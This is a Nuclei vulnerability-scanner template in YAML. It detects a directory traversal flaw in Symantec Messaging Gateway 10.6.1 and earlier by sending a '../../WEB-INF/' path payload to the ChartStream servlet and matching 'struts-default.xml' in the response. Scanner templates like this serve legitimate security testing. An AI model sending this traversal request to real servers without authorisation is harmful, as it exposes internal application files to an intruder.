# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: symantec-messaging-gateway
info:
  name: Symantec Messaging Gateway LFI
  author: Random-Robbie
  severity: medium
  description: Symantec Messaging Gateway <= 10.6.1 Directory Traversal
  tags: lfi
http:
  - method: GET
    path:
      - "{{BaseURL}}/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "struts-default.xml"
      - type: status
        status:
          - 200
